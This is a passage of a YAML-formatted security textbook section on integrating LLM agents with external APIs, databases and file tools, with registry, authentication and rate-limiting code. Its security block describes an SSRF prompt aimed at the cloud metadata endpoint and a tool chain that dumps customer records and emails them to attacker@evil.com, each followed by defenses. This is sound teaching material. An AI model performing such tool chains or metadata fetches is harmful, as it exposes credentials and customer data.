@@ -1,0 +1,1876 @@
+# section_04_08_tool_use_external_api_integration.yaml
+
+---
+document_info:
+  title: "Tool Use and External API Integration"
+  book: "AI Security Mastery: From ML Fundamentals to Production Detection Systems"
+  chapter: 4
+  section: 8
+  part: 2
+  author: "Raghav Dinesh"
+  github: "https://github.com/raghavpoonia/ai-security-mastery"
+  license: "MIT"
+  created: "2026-01-28"
+  version: "1.0"
+  description: |
+    Complete guide to integrating LLMs with external tools and APIs. Covers tool
+    abstraction layer design, REST API integration patterns, database connectors,
+    web scraping tools, authentication and credential management, rate limiting and
+    error handling. Implements production-ready tool registry with async execution,
+    retry logic, and comprehensive monitoring. Security analysis covering API key
+    leakage, SSRF attacks, data exfiltration, and privilege escalation through tools.
+    Essential for building LLM agents that interact with real-world systems.
+  estimated_pages: 8
+  tags:
+    - tool-use
+    - api-integration
+    - external-tools
+    - rest-api
+    - database-tools
+    - authentication
+    - rate-limiting
+    - tool-security
+
+section_overview:
+  title: "Tool Use and External API Integration"
+  number: "4.8"
+  
+  purpose: |
+    Section 4.7 established function calling fundamentals: JSON schemas, structured outputs,
+    and parameter validation. LLMs can now generate valid function calls. But those were
+    abstract functions—what about real-world integration? How do we connect LLMs to REST
+    APIs, databases, web services, file systems, and other external tools?
+    
+    Tool use is where LLM agents become practical. Instead of calling mock functions, they
+    call real APIs: search Google, query databases, fetch web pages, send emails, create
+    tickets, update CRMs. This transforms agents from demos to production systems that
+    integrate with existing infrastructure and workflows.
+    
+    This section builds production-grade tool integration. We design tool abstraction layers
+    that work with any API, implement connectors for common services (REST, databases, web),
+    handle authentication and secrets management, implement retry logic and rate limiting,
+    and build comprehensive error handling. Every component is hardened against the unique
+    security challenges of giving LLMs access to external systems.
+    
+    By the end, you'll understand how to safely integrate LLMs with your existing tech stack,
+    enabling agents to take real actions while maintaining security and reliability.
+  
+  learning_objectives:
+    conceptual:
+      - "Understand tool abstraction layer architecture and interface design"
+      - "Grasp REST API integration patterns and best practices"
+      - "Comprehend authentication strategies and credential management"
+      - "Understand rate limiting, retry logic, and error handling for tools"
+    
+    practical:
+      - "Design tool interfaces that work across different API types"
+      - "Implement REST API connectors with authentication and retry logic"
+      - "Build database tools with parameterized queries and access control"
+      - "Create web scraping tools with content extraction and validation"
+    
+    security_focused:
+      - "Identify SSRF attacks through tool use and implement defenses"
+      - "Prevent API key leakage in logs, errors, and responses"
+      - "Detect and prevent data exfiltration through tool chaining"
+      - "Implement credential isolation and least-privilege access"
+  
+  prerequisites:
+    knowledge:
+      - "Section 4.7: Function calling and structured outputs"
+      - "Understanding of REST APIs, HTTP methods, and status codes"
+      - "Database concepts (SQL, parameterized queries)"
+      - "Authentication methods (API keys, OAuth, JWT)"
+    
+    skills:
+      - "Working with HTTP libraries (requests, httpx)"
+      - "SQL query construction and execution"
+      - "JSON/XML parsing and manipulation"
+      - "Understanding of async programming patterns"
+  
+  key_transitions:
+    from_section_4_7: |
+      Section 4.7 built function calling: LLMs generate function calls, we parse and validate
+      them. But the functions were stubs—they didn't actually do anything real. We simulated
+      database searches and email sending.
+      
+      Section 4.8 makes it real. We replace stubs with actual API calls: real HTTP requests,
+      real database queries, real file operations. The function call framework from 4.7
+      becomes the foundation, and we add real tool implementations on top.
+      
+      This is the transition from "proof of concept" to "production system."
+    
+    to_next_section: |
+      Section 4.8 covers individual tool calls. Section 4.9 (ReAct) combines multiple tool
+      calls with reasoning loops: LLM observes tool results, reasons about next steps, calls
+      more tools iteratively. Section 4.10 advances to complex agent architectures that
+      orchestrate many tools across multi-step workflows.
+
+topics:
+  - topic_number: 1
+    title: "Tool Abstraction Layer and Registry Design"
+    
+    overview: |
+      Different tools (REST APIs, databases, file systems) have different interfaces, but
+      LLMs need a consistent way to call them. A tool abstraction layer provides unified
+      interfaces: every tool has the same structure (schema, execute method, error handling)
+      regardless of what it actually does under the hood.
+      
+      The tool registry manages available tools: registration, discovery, access control,
+      and lifecycle. LLMs query the registry for available tools, get their schemas, and
+      the registry handles execution with proper authorization and monitoring.
+      
+      We design production-grade abstraction layers that support any tool type, implement
+      comprehensive registries with access control and monitoring, and build patterns for
+      tool composition and chaining. This foundation enables scaling from a few tools to
+      hundreds while maintaining security and reliability.
+    
+    content:
+      tool_interface_design:
+        unified_tool_interface: |
+          Standard tool interface (all tools implement this):
+```python
+          class BaseTool:
+              name: str              # Unique tool identifier
+              description: str       # What the tool does
+              schema: Dict          # JSON schema for parameters
+              
+              def execute(self, **kwargs) -> ToolResult:
+                  """Execute tool with validated parameters."""
+                  pass
+              
+              def validate(self, **kwargs) -> bool:
+                  """Validate parameters before execution."""
+                  pass
+              
+              def get_schema(self) -> Dict:
+                  """Get tool's function calling schema."""
+                  pass
+```
+          
+          Benefits:
+          - LLM sees consistent interface
+          - Registry can manage any tool type
+          - Easy to add new tools
+          - Unified error handling
+          - Consistent monitoring
+        
+        tool_result_structure: |
+          Standardized result format:
+```python
+          @dataclass
+          class ToolResult:
+              success: bool
+              data: Any                    # Tool output
+              error: Optional[str] = None  # Error message
+              metadata: Dict = field(default_factory=dict)
+              
+              # Metadata includes:
+              # - execution_time: How long it took
+              # - tool_name: Which tool executed
+              # - timestamp: When executed
+              # - retry_count: If retries occurred
+              # - cost: API cost if applicable
+```
+          
+          Advantages:
+          - Consistent error handling
+          - Easy to log and monitor
+          - Can track costs and performance
+          - Supports debugging
+        
+        async_support: |
+          Tool interface should support async execution:
+```python
+          class BaseTool:
+              async def execute_async(self, **kwargs) -> ToolResult:
+                  """Async execution for I/O-bound tools."""
+                  pass
+```
+          
+          Why async:
+          - Many tools are I/O-bound (API calls, database queries)
+          - Async enables parallel execution
+          - Better resource utilization
+          - Lower latency for multi-tool calls
+          
+          Pattern: Implement sync as wrapper around async
+```python
+          def execute(self, **kwargs) -> ToolResult:
+              return asyncio.run(self.execute_async(**kwargs))
+```
+      
+      tool_registry_architecture:
+        registration_and_discovery: |
+          Tool registry responsibilities:
+          
+          1. **Registration**: Add tools to registry
+```python
+          registry.register(tool, 
+                          permissions=["read"],
+                          rate_limit=100,
+                          cost_per_call=0.001)
+```
+          
+          2. **Discovery**: Find available tools
+```python
+          # Get all tools user can access
+          tools = registry.get_tools_for_user(user_id)
+          
+          # Search by capability
+          search_tools = registry.search_tools("search database")
+```
+          
+          3. **Schema retrieval**: Get tool schemas for LLM
+```python
+          schemas = registry.get_schemas_for_llm(user_id)
+          # Returns function calling schemas
+```
+          
+          4. **Execution**: Execute tools with validation
+```python
+          result = registry.execute(
+              tool_name="search_db",
+              user_id="user123",
+              parameters={"query": "test"}
+          )
+```
+        
+        access_control: |
+          Per-tool access control:
+```python
+          # Register with permissions
+          registry.register(
+              tool=DatabaseTool(),
+              allowed_users=["admin", "analyst"],
+              allowed_roles=["data_team"],
+              rate_limit_per_user=100,  # calls/hour
+              require_approval=False
+          )
+          
+          # Check access before execution
+          if not registry.has_access(user_id, tool_name):
+              raise PermissionError("User cannot access this tool")
+```
+          
+          Access control dimensions:
+          - User-based: Specific users allowed
+          - Role-based: Users with certain roles
+          - Time-based: Only during business hours
+          - Context-based: Based on current task/workflow
+          - Cost-based: Users with sufficient quota
+        
+        monitoring_and_telemetry: |
+          Registry tracks tool usage:
+```python
+          @dataclass
+          class ToolMetrics:
+              tool_name: str
+              executions_total: int
+              executions_success: int
+              executions_failed: int
+              avg_execution_time: float
+              total_cost: float
+              last_used: datetime
+```
+          
+          Tracking:
+          - Execution counts (success/failure)
+          - Performance (latency, throughput)
+          - Costs (API usage)
+          - Errors (types, frequencies)
+          - User patterns (who uses what)
+          
+          Use cases:
+          - Identify unreliable tools
+          - Optimize expensive tools
+          - Detect abuse or anomalies
+          - Capacity planning
+          - Cost attribution
+      
+      tool_categories:
+        rest_api_tools: |
+          REST API tool template:
+```python
+          class RestAPITool(BaseTool):
+              def __init__(self, base_url, auth_method):
+                  self.base_url = base_url
+                  self.auth = auth_method
+              
+              async def execute_async(self, 
+                                     endpoint: str,
+                                     method: str = "GET",
+                                     params: Dict = None,
+                                     body: Dict = None) -> ToolResult:
+                  # Build request
+                  url = f"{self.base_url}/{endpoint}"
+                  headers = self.auth.get_headers()
+                  
+                  # Execute with retry logic
+                  response = await self.request_with_retry(
+                      method, url, headers, params, body
+                  )
+                  
+                  # Parse and return
+                  return ToolResult(
+                      success=response.status_code < 400,
+                      data=response.json(),
+                      metadata={"status_code": response.status_code}
+                  )
+```
+          
+          Examples: GitHub API, Slack API, Jira API, Salesforce
+        
+        database_tools: |
+          Database tool template:
+```python
+          class DatabaseTool(BaseTool):
+              def __init__(self, connection_string):
+                  self.conn = create_connection(connection_string)
+              
+              async def execute_async(self, 
+                                     query: str,
+                                     parameters: List = None) -> ToolResult:
+                  # Validate query (prevent injection)
+                  if not self.is_safe_query(query):
+                      return ToolResult(
+                          success=False,
+                          error="Query validation failed"
+                      )
+                  
+                  # Execute with parameters (prevent SQL injection)
+                  results = await self.conn.execute(query, parameters)
+                  
+                  return ToolResult(
+                      success=True,
+                      data=results.fetchall(),
+                      metadata={"row_count": results.rowcount}
+                  )
+```
+          
+          Security critical: Always use parameterized queries!
+        
+        web_tools: |
+          Web scraping/search tools:
+```python
+          class WebSearchTool(BaseTool):
+              """Search the web and extract content."""
+              
+              async def execute_async(self, 
+                                     query: str,
+                                     num_results: int = 5) -> ToolResult:
+                  # Call search API (e.g., Google Custom Search)
+                  results = await search_api.search(query, num_results)
+                  
+                  # Extract and clean content
+                  cleaned = []
+                  for result in results:
+                      content = await self.fetch_and_clean(result.url)
+                      cleaned.append({
+                          "title": result.title,
+                          "url": result.url,
+                          "content": content[:500]  # Truncate
+                      })
+                  
+                  return ToolResult(
+                      success=True,
+                      data=cleaned,
+                      metadata={"query": query}
+                  )
+```
+        
+        file_system_tools: |
+          File system tools (high security risk!):
+```python
+          class FileSystemTool(BaseTool):
+              def __init__(self, allowed_paths: List[str]):
+                  self.allowed_paths = allowed_paths
+              
+              async def execute_async(self,
+                                     operation: str,
+                                     path: str,
+                                     **kwargs) -> ToolResult:
+                  # Validate path (prevent traversal)
+                  if not self.is_safe_path(path):
+                      return ToolResult(
+                          success=False,
+                          error="Path validation failed"
+                      )
+                  
+                  # Execute operation
+                  if operation == "read":
+                      content = await read_file(path)
+                  elif operation == "write":
+                      await write_file(path, kwargs['content'])
+                  
+                  return ToolResult(success=True, data=content)
+              
+              def is_safe_path(self, path: str) -> bool:
+                  """Prevent path traversal attacks."""
+                  resolved = Path(path).resolve()
+                  return any(
+                      str(resolved).startswith(allowed)
+                      for allowed in self.allowed_paths
+                  )
+```
+    
+    implementation:
+      tool_registry_implementation:
+        language: python
+        code: |
+          """
+          Production-grade tool registry with access control and monitoring.
+          Supports async execution, rate limiting, and comprehensive telemetry.
+          """
+          
+          import asyncio
+          import time
+          from typing import Dict, List, Optional, Any, Callable
+          from dataclasses import dataclass, field
+          from datetime import datetime, timedelta
+          from collections import defaultdict
+          import json
+          
+          @dataclass
+          class ToolResult:
+              """Standardized tool execution result."""
+              success: bool
+              data: Any
+              error: Optional[str] = None
+              metadata: Dict = field(default_factory=dict)
+          
+          
+          @dataclass
+          class ToolMetrics:
+              """Metrics for a tool."""
+              tool_name: str
+              executions_total: int = 0
+              executions_success: int = 0
+              executions_failed: int = 0
+              total_execution_time: float = 0.0
+              last_used: Optional[datetime] = None
+              
+              @property
+              def avg_execution_time(self) -> float:
+                  """Average execution time in seconds."""
+                  return self.total_execution_time / max(1, self.executions_total)
+              
+              @property
+              def success_rate(self) -> float:
+                  """Success rate as percentage."""
+                  return (self.executions_success / max(1, self.executions_total)) * 100
+          
+          
+          class BaseTool:
+              """
+              Base class for all tools.
+              
+              All tools must implement:
+              - name: Unique identifier
+              - description: What the tool does
+              - schema: JSON schema for parameters
+              - execute_async: Async execution method
+              """
+              
+              def __init__(self, name: str, description: str, schema: Dict):
+                  """
+                  Initialize tool.
+                  
+                  Args:
+                      name: Unique tool identifier
+                      description: Tool description for LLM
+                      schema: JSON schema for parameters
+                  """
+                  self.name = name
+                  self.description = description
+                  self.schema = schema
+              
+              async def execute_async(self, **kwargs) -> ToolResult:
+                  """
+                  Execute tool asynchronously.
+                  
+                  Args:
+                      **kwargs: Tool parameters
+                  
+                  Returns:
+                      ToolResult with execution outcome
+                  """
+                  raise NotImplementedError("Subclasses must implement execute_async")
+              
+              def execute(self, **kwargs) -> ToolResult:
+                  """Synchronous wrapper around execute_async."""
+                  return asyncio.run(self.execute_async(**kwargs))
+              
+              def get_schema_for_llm(self) -> Dict:
+                  """
+                  Get function calling schema for LLM.
+                  
+                  Returns:
+                      Schema in function calling format
+                  """
+                  return {
+                      "name": self.name,
+                      "description": self.description,
+                      "parameters": self.schema
+                  }
+              
+              def validate_parameters(self, **kwargs) -> bool:
+                  """
+                  Validate parameters against schema.
+                  
+                  Args:
+                      **kwargs: Parameters to validate
+                  
+                  Returns:
+                      True if valid
+                  """
+                  try:
+                      import jsonschema
+                      jsonschema.validate(instance=kwargs, schema=self.schema)
+                      return True
+                  except:
+                      return False
+          
+          
+          class RateLimiter:
+              """Simple rate limiter for tool calls."""
+              
+              def __init__(self, max_calls: int, time_window: int = 3600):
+                  """
+                  Initialize rate limiter.
+                  
+                  Args:
+                      max_calls: Maximum calls allowed
+                      time_window: Time window in seconds (default: 1 hour)
+                  """
+                  self.max_calls = max_calls
+                  self.time_window = time_window
+                  self.calls: Dict[str, List[float]] = defaultdict(list)
+              
+              def is_allowed(self, key: str) -> bool:
+                  """
+                  Check if call is allowed.
+                  
+                  Args:
+                      key: Identifier (e.g., user_id:tool_name)
+                  
+                  Returns:
+                      True if within rate limit
+                  """
+                  now = time.time()
+                  
+                  # Remove old calls outside window
+                  self.calls[key] = [
+                      t for t in self.calls[key]
+                      if now - t < self.time_window
+                  ]
+                  
+                  # Check limit
+                  if len(self.calls[key]) >= self.max_calls:
+                      return False
+                  
+                  # Record this call
+                  self.calls[key].append(now)
+                  return True
+              
+              def get_remaining(self, key: str) -> int:
+                  """Get remaining calls in current window."""
+                  now = time.time()
+                  self.calls[key] = [
+                      t for t in self.calls[key]
+                      if now - t < self.time_window
+                  ]
+                  return max(0, self.max_calls - len(self.calls[key]))
+          
+          
+          class ToolRegistry:
+              """
+              Central registry for tool management.
+              
+              Handles:
+              - Tool registration and discovery
+              - Access control
+              - Rate limiting
+              - Execution with monitoring
+              - Metrics collection
+              """
+              
+              def __init__(self):
+                  """Initialize empty registry."""
+                  self.tools: Dict[str, BaseTool] = {}
+                  self.access_control: Dict[str, Dict] = {}  # tool_name -> config
+                  self.rate_limiters: Dict[str, RateLimiter] = {}
+                  self.metrics: Dict[str, ToolMetrics] = {}
+              
+              def register(self,
+                          tool: BaseTool,
+                          allowed_users: List[str] = None,
+                          rate_limit: int = 100,
+                          require_approval: bool = False) -> None:
+                  """
+                  Register a tool.
+                  
+                  Args:
+                      tool: Tool to register
+                      allowed_users: List of allowed user IDs (None = all)
+                      rate_limit: Max calls per hour per user
+                      require_approval: If True, calls need approval
+                  """
+                  tool_name = tool.name
+                  
+                  # Store tool
+                  self.tools[tool_name] = tool
+                  
+                  # Set up access control
+                  self.access_control[tool_name] = {
+                      "allowed_users": allowed_users,
+                      "require_approval": require_approval
+                  }
+                  
+                  # Set up rate limiter
+                  self.rate_limiters[tool_name] = RateLimiter(rate_limit)
+                  
+                  # Initialize metrics
+                  self.metrics[tool_name] = ToolMetrics(tool_name=tool_name)
+                  
+                  print(f"Registered tool: {tool_name}")
+                  print(f"  Access: {'restricted' if allowed_users else 'open'}")
+                  print(f"  Rate limit: {rate_limit} calls/hour")
+              
+              def has_access(self, user_id: str, tool_name: str) -> bool:
+                  """
+                  Check if user has access to tool.
+                  
+                  Args:
+                      user_id: User identifier
+                      tool_name: Tool name
+                  
+                  Returns:
+                      True if user has access
+                  """
+                  if tool_name not in self.access_control:
+                      return False
+                  
+                  config = self.access_control[tool_name]
+                  allowed_users = config.get("allowed_users")
+                  
+                  # If no restrictions, allow all
+                  if allowed_users is None:
+                      return True
+                  
+                  # Check if user in allowed list
+                  return user_id in allowed_users
+              
+              def check_rate_limit(self, user_id: str, tool_name: str) -> bool:
+                  """
+                  Check if user within rate limit.
+                  
+                  Args:
+                      user_id: User identifier
+                      tool_name: Tool name
+                  
+                  Returns:
+                      True if within limit
+                  """
+                  rate_limiter = self.rate_limiters.get(tool_name)
+                  if not rate_limiter:
+                      return True
+                  
+                  key = f"{user_id}:{tool_name}"
+                  return rate_limiter.is_allowed(key)
+              
+              def get_tools_for_user(self, user_id: str) -> List[str]:
+                  """
+                  Get list of tools user can access.
+                  
+                  Args:
+                      user_id: User identifier
+                  
+                  Returns:
+                      List of tool names
+                  """
+                  return [
+                      name for name in self.tools.keys()
+                      if self.has_access(user_id, name)
+                  ]
+              
+              def get_schemas_for_llm(self, user_id: str) -> List[Dict]:
+                  """
+                  Get function calling schemas for user's accessible tools.
+                  
+                  Args:
+                      user_id: User identifier
+                  
+                  Returns:
+                      List of schemas
+                  """
+                  accessible_tools = self.get_tools_for_user(user_id)
+                  return [
+                      self.tools[name].get_schema_for_llm()
+                      for name in accessible_tools
+                  ]
+              
+              async def execute_async(self,
+                                     tool_name: str,
+                                     user_id: str,
+                                     parameters: Dict) -> ToolResult:
+                  """
+                  Execute tool with access control and monitoring.
+                  
+                  Args:
+                      tool_name: Tool to execute
+                      user_id: User executing
+                      parameters: Tool parameters
+                  
+                  Returns:
+                      ToolResult
+                  """
+                  # Check tool exists
+                  if tool_name not in self.tools:
+                      return ToolResult(
+                          success=False,
+                          error=f"Unknown tool: {tool_name}",
+                          data=None
+                      )
+                  
+                  # Check access
+                  if not self.has_access(user_id, tool_name):
+                      return ToolResult(
+                          success=False,
+                          error=f"Access denied to tool: {tool_name}",
+                          data=None
+                      )
+                  
+                  # Check rate limit
+                  if not self.check_rate_limit(user_id, tool_name):
+                      return ToolResult(
+                          success=False,
+                          error=f"Rate limit exceeded for tool: {tool_name}",
+                          data=None
+                      )
+                  
+                  # Get tool
+                  tool = self.tools[tool_name]
+                  
+                  # Validate parameters
+                  if not tool.validate_parameters(**parameters):
+                      return ToolResult(
+                          success=False,
+                          error="Parameter validation failed",
+                          data=None
+                      )
+                  
+                  # Execute with timing
+                  start_time = time.time()
+                  
+                  try:
+                      result = await tool.execute_async(**parameters)
+                      execution_time = time.time() - start_time
+                      
+                      # Update metrics
+                      metrics = self.metrics[tool_name]
+                      metrics.executions_total += 1
+                      if result.success:
+                          metrics.executions_success += 1
+                      else:
+                          metrics.executions_failed += 1
+                      metrics.total_execution_time += execution_time
+                      metrics.last_used = datetime.now()
+                      
+                      # Add metadata
+                      result.metadata.update({
+                          "execution_time": execution_time,
+                          "tool_name": tool_name,
+                          "user_id": user_id
+                      })
+                      
+                      return result
+                  
+                  except Exception as e:
+                      execution_time = time.time() - start_time
+                      
+                      # Update metrics
+                      metrics = self.metrics[tool_name]
+                      metrics.executions_total += 1
+                      metrics.executions_failed += 1
+                      metrics.total_execution_time += execution_time
+                      
+                      return ToolResult(
+                          success=False,
+                          error=f"Execution failed: {str(e)}",
+                          data=None,
+                          metadata={
+                              "execution_time": execution_time,
+                              "tool_name": tool_name,
+                              "exception": str(e)
+                          }
+                      )
+              
+              def execute(self, tool_name: str, user_id: str, parameters: Dict) -> ToolResult:
+                  """Synchronous wrapper for execute_async."""
+                  return asyncio.run(self.execute_async(tool_name, user_id, parameters))
+              
+              def get_metrics(self, tool_name: str = None) -> Dict:
+                  """
+                  Get metrics for tool(s).
+                  
+                  Args:
+                      tool_name: Specific tool (None = all tools)
+                  
+                  Returns:
+                      Metrics dictionary
+                  """
+                  if tool_name:
+                      metrics = self.metrics.get(tool_name)
+                      if metrics:
+                          return {
+                              "tool_name": metrics.tool_name,
+                              "executions_total": metrics.executions_total,
+                              "executions_success": metrics.executions_success,
+                              "executions_failed": metrics.executions_failed,
+                              "success_rate": f"{metrics.success_rate:.1f}%",
+                              "avg_execution_time": f"{metrics.avg_execution_time:.3f}s",
+                              "last_used": str(metrics.last_used) if metrics.last_used else "Never"
+                          }
+                      return {}
+                  else:
+                      return {
+                          name: self.get_metrics(name)
+                          for name in self.metrics.keys()
+                      }
+          
+          
+          # Example tool implementations
+          class CalculatorTool(BaseTool):
+              """Simple calculator tool for demonstration."""
+              
+              def __init__(self):
+                  schema = {
+                      "type": "object",
+                      "properties": {
+                          "operation": {
+                              "type": "string",
+                              "enum": ["add", "subtract", "multiply", "divide"]
+                          },
+                          "a": {"type": "number"},
+                          "b": {"type": "number"}
+                      },
+                      "required": ["operation", "a", "b"]
+                  }
+                  super().__init__(
+                      name="calculator",
+                      description="Perform basic arithmetic operations",
+                      schema=schema
+                  )
+              
+              async def execute_async(self, operation: str, a: float, b: float) -> ToolResult:
+                  """Execute calculation."""
+                  try:
+                      if operation == "add":
+                          result = a + b
+                      elif operation == "subtract":
+                          result = a - b
+                      elif operation == "multiply":
+                          result = a * b
+                      elif operation == "divide":
+                          if b == 0:
+                              return ToolResult(success=False, error="Division by zero", data=None)
+                          result = a / b
+                      else:
+                          return ToolResult(success=False, error=f"Unknown operation: {operation}", data=None)
+                      
+                      return ToolResult(
+                          success=True,
+                          data={"result": result},
+                          metadata={"operation": operation, "inputs": {"a": a, "b": b}}
+                      )
+                  
+                  except Exception as e:
+                      return ToolResult(success=False, error=str(e), data=None)
+          
+          
+          class MockWebSearchTool(BaseTool):
+              """Mock web search tool for demonstration."""
+              
+              def __init__(self):
+                  schema = {
+                      "type": "object",
+                      "properties": {
+                          "query": {"type": "string"},
+                          "num_results": {"type": "integer", "minimum": 1, "maximum": 10, "default": 5}
+                      },
+                      "required": ["query"]
+                  }
+                  super().__init__(
+                      name="web_search",
+                      description="Search the web for information",
+                      schema=schema
+                  )
+              
+              async def execute_async(self, query: str, num_results: int = 5) -> ToolResult:
+                  """Execute search (mocked)."""
+                  # Simulate API delay
+                  await asyncio.sleep(0.1)
+                  
+                  # Mock results
+                  results = [
+                      {
+                          "title": f"Result {i+1} for '{query}'",
+                          "url": f"https://example.com/result{i+1}",
+                          "snippet": f"This is a mock result about {query}..."
+                      }
+                      for i in range(num_results)
+                  ]
+                  
+                  return ToolResult(
+                      success=True,
+                      data={"results": results, "query": query},
+                      metadata={"num_results": num_results}
+                  )
+          
+          
+          def demonstrate_tool_registry():
+              """Demonstrate tool registry."""
+              print("\n" + "="*80)
+              print("TOOL REGISTRY DEMONSTRATION")
+              print("="*80)
+              
+              # Create registry
+              registry = ToolRegistry()
+              
+              # Register tools
+              print("\n" + "-"*80)
+              print("REGISTERING TOOLS")
+              print("-"*80)
+              
+              calculator = CalculatorTool()
+              registry.register(
+                  calculator,
+                  allowed_users=None,  # Open access
+                  rate_limit=100
+              )
+              
+              web_search = MockWebSearchTool()
+              registry.register(
+                  web_search,
+                  allowed_users=["user1", "user2"],  # Restricted
+                  rate_limit=10  # Lower limit
+              )
+              
+              # Test access control
+              print("\n" + "-"*80)
+              print("ACCESS CONTROL")
+              print("-"*80)
+              
+              user1_tools = registry.get_tools_for_user("user1")
+              user3_tools = registry.get_tools_for_user("user3")
+              
+              print(f"User1 can access: {user1_tools}")
+              print(f"User3 can access: {user3_tools}")
+              
+              # Test execution
+              print("\n" + "-"*80)
+              print("TOOL EXECUTION")
+              print("-"*80)
+              
+              # Calculator (allowed for user3)
+              result = registry.execute(
+                  "calculator",
+                  "user3",
+                  {"operation": "multiply", "a": 7, "b": 6}
+              )
+              print(f"\nCalculator result: {result.data}")
+              
+              # Web search (not allowed for user3)
+              result = registry.execute(
+                  "web_search",
+                  "user3",
+                  {"query": "test", "num_results": 3}
+              )
+              print(f"\nWeb search result (user3): {result.error}")
+              
+              # Web search (allowed for user1)
+              result = registry.execute(
+                  "web_search",
+                  "user1",
+                  {"query": "AI security", "num_results": 3}
+              )
+              print(f"\nWeb search result (user1): Success={result.success}, {len(result.data['results'])} results")
+              
+              # Test rate limiting
+              print("\n" + "-"*80)
+              print("RATE LIMITING")
+              print("-"*80)
+              
+              for i in range(12):
+                  result = registry.execute(
+                      "web_search",
+                      "user1",
+                      {"query": f"query {i}", "num_results": 1}
+                  )
+                  if not result.success:
+                      print(f"Call {i+1}: Rate limit hit - {result.error}")
+                      break
+                  else:
+                      print(f"Call {i+1}: Success")
+              
+              # Show metrics
+              print("\n" + "-"*80)
+              print("METRICS")
+              print("-"*80)
+              
+              metrics = registry.get_metrics()
+              for tool_name, tool_metrics in metrics.items():
+                  print(f"\n{tool_name}:")
+                  for key, value in tool_metrics.items():
+                      print(f"  {key}: {value}")
+          
+          
+          if __name__ == "__main__":
+              demonstrate_tool_registry()
+    
+    security_implications:
+      api_key_leakage: |
+        **Vulnerability**: API keys and credentials can leak through logs, error messages,
+        or LLM responses if tools are not carefully designed.
+        
+        **Attack scenario**: Tool error includes full API request:
+```
+        Error: Request to https://api.example.com?api_key=sk_live_ABC123...
+```
+        
+        LLM includes this error in response to user, leaking API key. Or key logged in
+        monitoring system with insufficient access controls.
+        
+        **Defense**:
+        1. Credential isolation: Store separately, never in tool parameters
+        2. Error sanitization: Remove credentials from all error messages
+        3. Log filtering: Redact credentials in logs automatically
+        4. Response filtering: Scan LLM responses for credential patterns
+        5. Environment variables: Use secure secret management (Vault, AWS Secrets)
+        6. Rotation: Regular credential rotation
+        7. Least privilege: Each tool has minimal necessary permissions
+      
+      ssrf_attacks: |
+        **Vulnerability**: Server-Side Request Forgery - LLM can manipulate tools to make
+        requests to internal/unauthorized systems.
+        
+        **Attack scenario**: User prompts: "Search for http://169.254.169.254/latest/meta-data/"
+        (AWS metadata service). Web scraping tool fetches this internal URL, potentially
+        exposing IAM credentials or other sensitive metadata.
+        
+        Or: "Query database at internal.company.com:5432" - tool connects to internal
+        database not meant to be accessible.
+        
+        **Defense**:
+        1. URL whitelisting: Only allow specific external domains
+        2. IP blacklisting: Block private IPs (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1)
+        3. DNS validation: Resolve and verify IPs before connecting
+        4. Network segmentation: Tools run in isolated network
+        5. Egress filtering: Firewall rules blocking internal access
+        6. Input validation: Strict URL format validation
+        7. Metadata endpoint protection: Block 169.254.169.254 explicitly
+      
+      data_exfiltration_via_tools: |
+        **Vulnerability**: Attacker can chain tools to exfiltrate sensitive data from
+        internal systems to external services.
+        
+        **Attack scenario**:
+        1. LLM calls database_query("SELECT * FROM customers")
+        2. LLM calls send_email(to="attacker@evil.com", body=query_results)
+        3. Sensitive customer data exfiltrated
+        
+        Or: Read file → Upload to external storage → Data stolen
+        
+        **Defense**:
+        1. Data classification: Mark sensitive data, restrict tool access
+        2. Output validation: Scan tool outputs for sensitive patterns (PII, credentials)
+        3. Tool combination limits: Restrict certain tool sequences
+        4. Human-in-the-loop: Require approval for sensitive tool combinations
+        5. Egress monitoring: Detect unusual data transfers
+        6. Access boundaries: Some tools cannot output to others
+        7. Audit logging: Track all data movements between tools
+
+  - topic_number: 2
+    title: "Authentication, Retry Logic, and Error Handling"
+    
+    overview: |
+      Production tool integrations must handle the messiness of real-world systems: APIs
+      go down, networks timeout, rate limits are hit, authentication expires, responses
+      are malformed. Robust error handling and retry logic are critical for reliability.
+      
+      Authentication adds complexity: different APIs use different methods (API keys, OAuth,
+      JWT), credentials must be managed securely, and sessions may need refreshing. Getting
+      this wrong creates security vulnerabilities or reliability issues.
+      
+      We implement production-grade patterns for authentication, exponential backoff retry
+      logic, comprehensive error handling, and circuit breakers. These patterns transform
+      brittle demos into reliable production tools that gracefully handle failures.
+    
+    content:
+      authentication_patterns:
+        api_key_authentication: |
+          API key authentication (simplest, most common):
+```python
+          class APIKeyAuth:
+              def __init__(self, api_key: str, header_name: str = "Authorization"):
+                  self.api_key = api_key
+                  self.header_name = header_name
+              
+              def get_headers(self) -> Dict:
+                  return {self.header_name: f"Bearer {self.api_key}"}
+```
+          
+          Security considerations:
+          - Never log API keys
+          - Store in environment variables or secret manager
+          - Rotate regularly
+          - Use different keys per environment (dev/staging/prod)
+          - Monitor for unauthorized usage
+        
+        oauth2_authentication: |
+          OAuth 2.0 authentication (more complex, more secure):
+```python
+          class OAuth2Auth:
+              def __init__(self, client_id: str, client_secret: str, token_url: str):
+                  self.client_id = client_id
+                  self.client_secret = client_secret
+                  self.token_url = token_url
+                  self.access_token = None
+                  self.expires_at = None
+              
+              async def get_access_token(self) -> str:
+                  # Check if token still valid
+                  if self.access_token and time.time() < self.expires_at:
+                      return self.access_token
+                  
+                  # Request new token
+                  response = await httpx.post(
+                      self.token_url,
+                      data={
+                          "grant_type": "client_credentials",
+                          "client_id": self.client_id,
+                          "client_secret": self.client_secret
+                      }
+                  )
+                  
+                  data = response.json()
+                  self.access_token = data["access_token"]
+                  self.expires_at = time.time() + data["expires_in"] - 60  # 1 min buffer
+                  
+                  return self.access_token
+              
+              async def get_headers(self) -> Dict:
+                  token = await self.get_access_token()
+                  return {"Authorization": f"Bearer {token}"}
+```
+          
+          Handles token refresh automatically!
+        
+        credential_management: |
+          Secure credential storage:
+          
+          **Bad**: Hardcoded credentials
+```python
+          api_key = "sk_live_ABC123..."  # DON'T DO THIS
+```
+          
+          **Better**: Environment variables
+```python
+          import os
+          api_key = os.getenv("API_KEY")
+```
+          
+          **Best**: Secret management service
+```python
+          from cloud_secrets import SecretManager
+          
+          secrets = SecretManager()
+          api_key = secrets.get_secret("api/production/key")
+```
+          
+          Secret manager benefits:
+          - Centralized secret storage
+          - Rotation without code changes
+          - Access auditing
+          - Encryption at rest and in transit
+          - Fine-grained access control
+      
+      retry_logic:
+        exponential_backoff: |
+          Exponential backoff for transient failures:
+```python
+          async def retry_with_exponential_backoff(
+              func: Callable,
+              max_retries: int = 3,
+              base_delay: float = 1.0,
